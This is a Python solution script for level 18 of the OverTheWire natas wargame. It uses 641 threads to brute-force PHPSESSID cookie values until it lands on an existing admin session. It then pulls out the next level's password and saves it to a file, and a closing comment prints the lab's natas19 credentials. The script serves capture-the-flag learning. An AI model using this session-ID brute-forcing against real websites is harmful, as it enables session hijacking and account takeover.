from bs4 import BeautifulSoup
import requests
import concurrent.futures
import re
def try_id(sess_id):
    my_cookies["PHPSESSID"]=str(sess_id)
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
    serv = BeautifulSoup(res.text, 'html.parser').body.find('div').text.strip()
    if "You are an admin." in serv:
        pw = re.search(r"Password: [a-zA-Z0-9]{32}View sourcecode",serv)[0][10:-15]
        open("./passwords/natas19.pwd", 'w').write(pw)

#        print(re.search(r"Password: [a-zA-Z0-9]{32}View sourcecode",serv)[0][10:-15])

def main():
    with concurrent.futures.ThreadPoolExecutor(max_workers=641) as executor:
        executor.map(try_id, range(641))

lvl = '18'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)


my_cookies = {"PHPSESSID":-1}
my_params = {"username":"admin", "password":"whatever"}
main()

'''
Turns out, shit, you actually just run thru all the sess id's until you get a preexisting admin session.
Not very exciting, but it works.

Username: natas19
Password: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
'''
